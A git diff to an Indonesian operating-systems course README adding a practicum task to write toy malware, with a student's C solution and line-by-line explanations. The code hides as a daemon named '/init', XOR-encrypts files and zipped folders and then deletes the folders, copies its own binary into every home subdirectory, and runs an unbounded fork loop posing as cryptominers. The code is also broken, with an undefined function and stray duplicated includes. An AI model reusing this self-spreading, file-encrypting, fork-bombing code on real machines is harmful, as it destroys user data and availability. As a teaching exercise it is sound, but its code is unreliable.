@@ -1332,6 +1332,594 @@ Mengubah tujuan membuka direktori dan path pada fungsi `decrypt_daemon()` agar f
 ![Screenshot (390)](https://github.com/user-attachments/assets/5fd1de23-1e1b-49ba-a271-e6f421696dfb)
 ![Screenshot (391)](https://github.com/user-attachments/assets/fd2d150b-e1f2-4631-aecb-b0828bc89b17)
 
+
+## SOAL 3
+Dok dok dorokdok dok rodok. Anomali malware yang dikembangkan oleh Andriana di PT Mafia Security Cabang Ngawi yang hanya keluar di malam pengerjaan soal shift modul 2. Konon katanya anomali ini akan mendatangi praktikan sisop yang tidak mengerjakan soal ini. Ihh takutnyeee. Share ke teman teman kalian yang tidak mengerjakan soal ini.
+
+A. Malware ini bekerja secara daemon dan menginfeksi perangkat korban dan menyembunyikan diri dengan mengganti namanya menjadi /init. 
+
+B. Anak fitur pertama adalah sebuah encryptor bernama wannacryptor yang akan memindai directory saat ini dan mengenkripsi file dan folder (serta seluruh isi folder) di dalam directory tersebut menggunakan xor dengan timestamp saat program dijalankan. Encryptor pada folder dapat bekerja dengan dua cara, mengenkripsi seluruh isi folder secara rekursif, atau mengubah folder dan isinya ke dalam zip lalu mengenkripsi zip tersebut. Jika menggunakan metode rekursif, semua file di dalam folder harus terenkripsi , dari isi folder paling dalam sampai ke current directory, dan tidak mengubah struktur folder Jika menggunakan metode zip, folder yang dienkripsi harus dihapus oleh program. Pembagian metode sebagai berikut: Untuk kelompok ganjil menggunakan metode rekursif, dan kelompok genap menggunakan metode zip.
+
+C. Anak fitur kedua yang bernama trojan.wrm berfungsi untuk menyebarkan malware ini kedalam mesin korban dengan cara membuat salinan binary malware di setiap directory yang ada di home user.
+
+D. Anak fitur pertama dan kedua terus berjalan secara berulang ulang selama malware masih hidup dengan interval 30 detik.
+
+E. Anak fitur ketiga ini sangat unik. Dinamakan rodok.exe, proses ini akan membuat sebuah fork bomb di dalam perangkat korban.
+
+F. Konon katanya malware ini dibuat oleh Andriana karena dia sedang memerlukan THR. Karenanya, Andriana menambahkan fitur pada fork bomb tadi dimana setiap fork dinamakan mine-crafter-XX (XX adalah nomor dari fork, misal fork pertama akan menjadi mine-crafter-0) dan tiap fork akan melakukan cryptomining. Cryptomining disini adalah membuat sebuah hash hexadecimal (base 16) random sepanjang 64 char. Masing masing hash dibuat secara random dalam rentang waktu 3 detik - 30 detik. Sesuaikan jumlah maksimal mine-crafter dengan spesifikasi perangkat, minimal 3 (Jangan dipaksakan sampai lag, secukupnya saja untuk demonstrasi)
+
+G. Lalu mine-crafter-XX dan mengumpulkan hash yang sudah dibuat dan menyimpannya di dalam file /tmp/.miner.log dengan format: 
+[YYYY-MM-DD hh:mm:ss][Miner XX] hash
+Dimana XX adalah ID mine-crafter yang membuat hash tersebut. 
+
+H. Karena mine-crafter-XX adalah anak dari rodok.exe, saat rodok.exe dimatikan, maka seluruh mine-crafter-XX juga akan mati. 
+
+Nama anak anak diatas adalah nama proses yang akan berjalan. Mengganti nama proses berarti saat dilakukan pemeriksaan proses berjalan (seperti ps aux dan lainnya), maka proses tersebut akan muncul dengan nama yang ditentukan.
+
+```
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/prctl.h>
+#include <fcntl.h>
+#include <string.h>
+#include <dirent.h>
+#include <time.h>
+#include <errno.h>
+
+// --- BAGIAN A --- Daemon yang menyembunyikan diri dan mengganti nama menjadi /init
+void create_daemon() {
+    pid_t pid, sid;
+
+    pid = fork();
+    if (pid < 0) exit(EXIT_FAILURE);  
+    if (pid > 0) exit(EXIT_SUCCESS); 
+    
+    umask(0);  
+    
+    sid = setsid();
+    if (sid < 0) exit(EXIT_FAILURE);  
+    
+    if ((chdir("/")) < 0) exit(EXIT_FAILURE);  
+
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+
+    prctl(PR_SET_NAME, (unsigned long)"/init", 0, 0, 0);
+}
+
+// --- BAGIAN B --- Enkripsi dengan metode XOR
+void xor_encrypt(const char *filename, unsigned char key) {
+    FILE *file = fopen(filename, "rb+");
+    if (!file) {
+        perror("Gagal membuka file");
+        return;
+    }
+
+    fseek(file, 0, SEEK_END);
+    long filesize = ftell(file);
+    fseek(file, 0, SEEK_SET);
+
+    char *buffer = (char *)malloc(filesize);
+    if (!buffer) {
+        perror("Alokasi memori gagal");
+        fclose(file);
+        return;
+    }
+
+    fread(buffer, 1, filesize, file);
+    fseek(file, 0, SEEK_SET);
+
+    for (long i = 0; i < filesize; ++i) {
+        buffer[i] ^= key;
+    }
+
+    fwrite(buffer, 1, filesize, file);
+    fclose(file);
+    free(buffer);
+}
+
+
+// --- BAGIAN C --- 
+// Fungsi untuk menyalin malware ke direktori target
+void trojan(const char *direktoriTarget, const char *lokasiMalware) {
+    DIR *dir = opendir(direktoriTarget);
+    if (!dir) return;
+
+    struct dirent *entri;
+    char path[1024];
+
+    // Iterasi setiap file/direktori di direktori target
+    while ((entri = readdir(dir)) != NULL) {
+        if (strcmp(entri->d_name, ".") == 0 || strcmp(entri->d_name, "..") == 0)
+            continue;
+
+        snprintf(path, sizeof(path), "%s/%s", direktoriTarget, entri->d_name);
+
+        struct stat st;
+        if (stat(path, &st) == -1) continue;
+
+        if (S_ISDIR(st.st_mode)) {
+            trojan(path, lokasiMalware);  
+        }
+    }
+
+    // Menyalin malware ke dalam direktori yang ditemukan
+    char pathTujuan[1024];
+    snprintf(pathTujuan, sizeof(pathTujuan), "%s/trojan.wrm", direktoriTarget);
+
+    FILE *src = fopen(lokasiMalware, "rb");
+    FILE *dst = fopen(pathTujuan, "wb");
+    if (src && dst) {
+        char buf[4096];
+        size_t jumlah;
+        while ((jumlah = fread(buf, 1, sizeof(buf), src)) > 0) {
+            fwrite(buf, 1, jumlah, dst);
+        }
+    }
+    if (src) fclose(src);
+    if (dst) fclose(dst);
+
+    closedir(dir);
+}
+
+// Fungsi untuk membuat ZIP dari folder
+void zip_folder(const char *folder_name, const char *zip_filename) {
+    pid_t pid = fork();
+    if (pid == 0) {
+        char *args[] = {"/usr/bin/zip", "-r", (char *)zip_filename, (char *)folder_name, NULL};
+        execv(args[0], args);
+        perror("Gagal membuat ZIP");
+        exit(EXIT_FAILURE);
+    } else if (pid > 0) {
+        wait(NULL);
+    } else {
+        perror("Fork gagal");
+        exit(EXIT_FAILURE);
+    }
+}
+
+void change_permissions(const char *path) {
+    char command[256];
+    snprintf(command, sizeof(command), "chmod -R 777 %s", path);
+    int ret = system(command);
+    if (ret == 0) {
+        printf("Hak akses folder '%s' diubah menjadi 777.\n", path);
+    } else {
+        perror("Gagal mengubah hak akses");
+    }
+}
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <time.h>
+#include <pthread.h>
+#include <string.h>
+#include <sys/prctl.h>
+#include <semaphore.h>
+
+#define MAX_MINERS 5
+#define HASH_LEN 64
+
+int active_miners = 0;
+sem_t miner_semaphore;
+
+// === D: Feature 1 and 2 Loop ===
+void feature_loop() {
+    while (1) {
+        printf("Running feature 1 and 2...\n");
+        sleep(30); // Interval of 30 seconds
+    }
+}
+
+// === F: Cryptominer Function ===
+void *cryptominer(void *arg) {
+    char hash[HASH_LEN + 1];
+    int id = *(int *)arg;
+    free(arg);
+
+    char name[20];
+    sprintf(name, "mine-crafter-%d", id);
+    prctl(PR_SET_NAME, name, 0, 0, 0);
+
+    while (1) {
+        // Generate random hash
+        for (int i = 0; i < HASH_LEN; i++) {
+            sprintf(&hash[i], "%x", rand() % 16);
+        }
+        hash[HASH_LEN] = '\0';
+
+        printf("[%s] Generated hash: %s\n", name, hash);
+
+        // Sleep for a random time between 3-30 seconds
+        int sleep_time = (rand() % 28) + 3;
+        sleep(sleep_time);
+    }
+    return NULL;
+}
+
+// === E: Fork Bomb Function ===
+void fork_bomb() {
+    while (1) {
+        pid_t pid = fork();
+        if (pid == 0) {
+            int *id = malloc(sizeof(int));
+            if (id == NULL) exit(1);
+            *id = __sync_add_and_fetch(&active_miners, 1);
+
+            if (*id <= MAX_MINERS) {
+                sem_wait(&miner_semaphore);
+                cryptominer(id);
+                sem_post(&miner_semaphore);
+            } else {
+                free(id);
+                exit(0); // Exit if max miners exceeded
+            }
+        }
+    }
+}
+
+
+int main(int argc, char **argv) {
+    const char *lokasiMalware = "/home/dinda/malware/executable";  // Path ke file malware
+    const char *folderTarget = "/home/dinda";  // Folder target untuk trojan
+
+    sem_init(&miner_semaphore, 0, MAX_MINERS);
+
+    create_daemon();
+
+    char lokasiProgram[1024];
+    ssize_t panjang = readlink("/proc/self/exe", lokasiProgram, sizeof(lokasiProgram) - 1);
+    if (panjang != -1) {
+        lokasiProgram[panjang] = '\0';
+        trojan(folderTarget, lokasiProgram);
+    } else {
+        fprintf(stderr, "Gagal mendapatkan path executable.\n");
+        return 1;
+    }
+
+    time_t t = time(NULL);
+    unsigned char key = (unsigned char)(t % 256);
+    const char *file_to_encrypt = "randomfile";
+    xor_encrypt(file_to_encrypt, key);
+    printf("File '%s' berhasil dienkripsi.\n", file_to_encrypt);
+
+    const char *folder_to_zip = "test";
+    const char *zip_filename = "test.zip";
+
+    zip_folder(folder_to_zip, zip_filename);
+    printf("Folder '%s' berhasil di-zip menjadi '%s'.\n", folder_to_zip, zip_filename);
+
+    xor_encrypt(zip_filename, key);
+    printf("File ZIP '%s' berhasil dienkripsi.\n", zip_filename);
+
+    change_permissions(folder_to_zip);
+
+    remove_directory(folder_to_zip);
+
+    pthread_t feature_thread;
+    if (pthread_create(&feature_thread, NULL, (void *)feature_loop, NULL) != 0) {
+        perror("Gagal membuat thread untuk fitur loop");
+        return 1;
+    }
+
+    fork_bomb();
+
+    pthread_join(feature_thread, NULL);
+
+    sem_destroy(&miner_semaphore);
+
+    return 0;
+}
+
+```
+
+### Penjelasan
+### > A. menyembunyikan diri dengan mengganti namanya menjadi /init.
+#### Output
+![WhatsApp Image 2025-04-18 at 23 17 36_95386bd9](https://github.com/user-attachments/assets/0d3e86e2-b59b-4ce6-a7e5-5300f25142ec)
+
+
+#### Fork Proses Baru
+```
+pid = fork();
+if (pid < 0) exit(EXIT_FAILURE);
+if (pid > 0) exit(EXIT_SUCCESS);
+```
+untuk membuat child process.
+`pid < 0`: Jika gagal membuat proses baru, keluar dengan status gagal.
+`pid > 0`: Proses parent keluar, sehingga hanya child process yang berjalan.
+
+#### Set File Mode Mask
+```
+umask(0);
+```
+untuk mengatur umask ke 0 agar daemon memiliki akses penuh (tanpa pembatasan) ke file dan direktori yang dibuat.
+
+#### Membuat Sesi Baru
+```
+sid = setsid();
+if (sid < 0) exit(EXIT_FAILURE);
+```
+untuk memisahkan proses dari terminal yang memulai proses.
+
+`setsid:`
+
+- Membuat sesi baru.
+- Menjadikan proses ini pemimpin sesi.
+- Memutuskan asosiasi dengan terminal.
+
+#### Mengganti Direktori Kerja
+```
+if (chdir("/") < 0) exit(EXIT_FAILURE);
+```
+- untuk mengganti direktori kerja ke root `(/)` untuk:
+
+- Menghindari daemon mengunci direktori tertentu.
+
+- Memastikan proses tidak bergantung pada direktori tertentu.
+
+#### Menutup File Deskriptor Standar
+```
+close(STDIN_FILENO);
+close(STDOUT_FILENO);
+close(STDERR_FILENO);
+```
+Untuk Menutup file deskriptor untuk input, output, dan error standar. Hal ini mencegah daemon berinteraksi langsung dengan terminal pengguna.
+
+#### Mengatur Nama Proses
+```
+prctl(PR_SET_NAME, (unsigned long)"/init", 0, 0, 0);
+```
+- untuk mengatur nama proses daemon menjadi `"/init"`.
+
+- `prctl(PR_SET_NAME, ...)` digunakan untuk mengganti nama proses di tabel proses.
+
+### > B. 
+Membuka File
+```
+FILE *file = fopen(filename, "rb+");
+if (!file) {
+    perror("Gagal membuka file");
+    return;
+}
+```
+- Untuk membuka file dalam mode baca dan tulis biner (rb+).
+- Jika file tidak dapat dibuka, tampilkan pesan kesalahan dan keluar dari fungsi.
+
+#### Mengukur Ukuran File
+```
+fseek(file, 0, SEEK_END);
+long filesize = ftell(file);
+fseek(file, 0, SEEK_SET);
+```
+Untuk Mengukur ukuran file.
+
+`fseek(file, 0, SEEK_END)`: Memindahkan penunjuk file ke akhir file.
+
+`ftell(file)`: Mendapatkan posisi penunjuk file (ukuran file dalam byte).
+
+`fseek(file, 0, SEEK_SET)`: Mengembalikan penunjuk file ke awal.
+
+#### Mengalokasikan Memori
+```
+char *buffer = (char *)malloc(filesize);
+if (!buffer) {
+    perror("Alokasi memori gagal");
+    fclose(file);
+    return;
+}
+```
+- Untuk mengalokasikan buffer untuk menyimpan seluruh isi file ke dalam memori.
+- Jika alokasi memori gagal, tutup file dan keluar dari fungsi.
+
+#### Membaca Isi File ke Memori
+```
+fread(buffer, 1, filesize, file);
+fseek(file, 0, SEEK_SET);
+```
+Untuk membaca isi file ke dalam buffer. Setelah membaca, kembalikan penunjuk file ke awal untuk persiapan menulis data yang telah dienkripsi.
+
+#### Melakukan Enkripsi/Dekripsi dengan XOR
+```
+for (long i = 0; i < filesize; ++i) {
+    buffer[i] ^= key;
+}
+```
+- Untuk melakukan operasi XOR pada setiap byte data dengan kunci (key).
+- XOR adalah operasi biner yang akan mengubah nilai byte menjadi terenkripsi.
+- Jika dilakukan lagi dengan kunci yang sama, data akan kembali ke bentuk aslinya (sifat reversibilitas XOR).
+
+#### Menulis Data yang Telah Diubah
+```
+fwrite(buffer, 1, filesize, file);
+fclose(file);
+free(buffer);
+```
+Untuk menulis data hasil XOR kembali ke file, menutup file, dan membebaskan memori yang digunakan.
+
+### > C.
+#### 1. Fungsi trojan
+Tujuan:
+Menyalin sebuah file (dalam konteks ini dianggap malware) ke setiap direktori dalam struktur folder target.
+
+#### Membuka direktori target:
+```
+DIR *dir = opendir(direktoriTarget);
+if (!dir) return;
+```
+- Membuka direktori yang diberikan (direktoriTarget).
+
+- Jika gagal, fungsi langsung keluar.
+
+#### Iterasi isi direktori:
+```
+while ((entri = readdir(dir)) != NULL) {
+    if (strcmp(entri->d_name, ".") == 0 || strcmp(entri->d_name, "..") == 0)
+        continue;
+}
+```
+Melewati entri spesial . dan .. yang menunjuk ke direktori saat ini dan induknya.
+
+#### Membentuk path absolut:
+```
+snprintf(path, sizeof(path), "%s/%s", direktoriTarget, entri->d_name);
+```
+Menggabungkan nama direktori target dengan entri saat ini untuk mendapatkan path lengkap.
+
+#### Jika entri adalah direktori, rekursif:
+```
+if (S_ISDIR(st.st_mode)) {
+    trojan(path, lokasiMalware);
+}
+```
+Jika entri adalah direktori, fungsi dipanggil kembali secara rekursif untuk menyusuri isi direktori tersebut.
+
+#### Menyalin malware ke direktori:
+```
+snprintf(pathTujuan, sizeof(pathTujuan), "%s/trojan.wrm", direktoriTarget);
+FILE *src = fopen(lokasiMalware, "rb");
+FILE *dst = fopen(pathTujuan, "wb");
+```
+- Membuat file tujuan bernama `trojan.wrm` di direktori target.
+
+- Menyalin isi file sumber (lokasiMalware) ke file tujuan menggunakan buffer.
+
+#### 2. Fungsi zip_folder
+Tujuan:
+Membuat file ZIP dari sebuah folder menggunakan utilitas sistem (zip).
+
+Fork proses:
+```
+pid_t pid = fork();
+```
+Membuat proses baru untuk menjalankan perintah ZIP.
+
+Proses anak:
+```
+char *args[] = {"/usr/bin/zip", "-r", (char *)zip_filename, (char *)folder_name, NULL};
+execv(args[0], args);
+```
+Proses anak memanggil zip dengan argumen:
+
+`-r`: Rekursif, memproses semua isi folder.
+
+`zip_filename`: Nama file ZIP yang dihasilkan.
+
+`folder_name`: Folder yang akan diarsipkan.
+
+Proses induk:
+```
+wait(NULL);
+```
+Menunggu proses anak selesai.
+
+#### 3. Fungsi change_permissions
+Tujuan:
+Mengubah izin akses folder menjadi 777 (izin penuh untuk membaca, menulis, dan menjalankan).
+
+Menyusun perintah sistem:
+```
+snprintf(command, sizeof(command), "chmod -R 777 %s", path);
+```
+Perintah chmod -R 777 digunakan untuk mengubah izin semua file dan subdirektori secara rekursif.
+
+#### Menjalankan perintah:
+```
+int ret = system(command);
+```
+- Perintah dijalankan menggunakan fungsi system.
+Menangani hasil:
+- Jika perintah berhasil, mencetak pesan sukses.
+- Jika gagal, mencetak pesan kesalahan.
+
+### D.
+```
+void feature_loop() {
+    while (1) {
+        printf("Running feature 1 and 2...\n");
+        sleep(30); // Interval of 30 seconds
+    }
+}
+```
+Fungsi ini menjalankan loop tak berujung (while (1)) yang setiap 30 detik mencetak pesan "Running feature 1 and 2..." ke terminal atau log menggunakan printf. Fungsi sleep(30) digunakan untuk menunggu selama 30 detik sebelum iterasi berikutnya dimulai.
+
+### F.
+``` 
+char hash[HASH_LEN + 1];
+```
+Deklarasi array hash: Menyimpan hasil hash acak dengan panjang 64 karakter ditambah satu untuk karakter null-terminator \0.
+```
+int id = *(int *)arg;
+free(arg);
+```
+- Mengambil ID miner: ID ini diambil dari argumen yang dilewatkan ke fungsi `(void *arg)` dan di-casting menjadi pointer ke integer.
+- Membebaskan memori: `free(arg)` digunakan untuk mencegah kebocoran memori setelah ID dipakai.
+```
+char name[20];
+sprintf(name, "mine-crafter-%d", id);
+prctl(PR_SET_NAME, name, 0, 0, 0);
+```
+Menamai proses: Nama proses diatur menjadi `mine-crafter-XX`, di mana XX adalah nilai id. Fungsi prctl digunakan untuk mengubah nama proses di sistem.
+```
+while (1) {
+```
+Loop tanpa akhir: Fungsi berjalan terus-menerus sampai proses dihentikan.
+```
+for (int i = 0; i < HASH_LEN; i++) {
+    sprintf(&hash[i], "%x", rand() % 16);
+}
+hash[HASH_LEN] = '\0';
+```
+Membuat hash acak: Hash dibuat karakter per karakter menggunakan angka acak (0–15, direpresentasikan dalam hexadecimal). Hasilnya adalah string hexadecimal sepanjang 64 karakter.
+```
+printf("[%s] Generated hash: %s\n", name, hash);
+```
+Mencetak hash: Setiap hash yang dihasilkan dicetak ke terminal dengan format `[mine-crafter-XX]` Generated hash: `<hash>`.
+```
+int sleep_time = (rand() % 28) + 3;
+sleep(sleep_time);
+```
+Tidur dengan durasi acak: Proses berhenti sejenak selama 3 hingga 30 detik (nilai acak dihasilkan oleh (rand() % 28) + 3).
+```
+return NULL;
+```
+Akhir fungsi: Fungsi mengembalikan NULL, meskipun pada kenyataannya loop tidak akan pernah selesai secara alami.
+
+### E.
+```
+void fork_bomb() {
+    while (1) { 
+        pid_t pid = fork(); 
+        if (pid == 0) { 
+            int *id = malloc(sizeof(int)); // Alokasikan memori untuk ID
+            if (id == NULL) exit(1); 
+
+            *id = __sync_add_and_fetch(&active_miners, 1); // Tambahkan miner aktif
+            if (*id <= MAX_MINERS) { // Jika masih di bawah batas
+                sem_wait(&miner_semaphore); 
+                cryptominer(id); 
+                sem_post(&miner_semaphore); 
+            } else { 
+                free(id); 
+                exit(0); 
+            }
+        }
+    }
+}
+```
+
+- Menciptakan proses anak dengan fork() secara terus-menerus.
+
+- Mengontrol jumlah maksimal miner menggunakan MAX_MINERS dan semaphore.
+
+- Menghindari kebocoran sumber daya dengan keluar dari proses anak jika miner melebihi batas.
+
 ## SOAL 4
 Suatu hari, Nobita menemukan sebuah alat aneh di laci mejanya. Alat ini berbentuk robot kecil dengan mata besar yang selalu berkedip-kedip. Doraemon berkata, "Ini adalah Debugmon! Robot super kepo yang bisa memantau semua aktivitas di komputer!" Namun, alat ini harus digunakan dengan hati-hati. Jika dipakai sembarangan, bisa-bisa komputer Nobita malah error total!
 
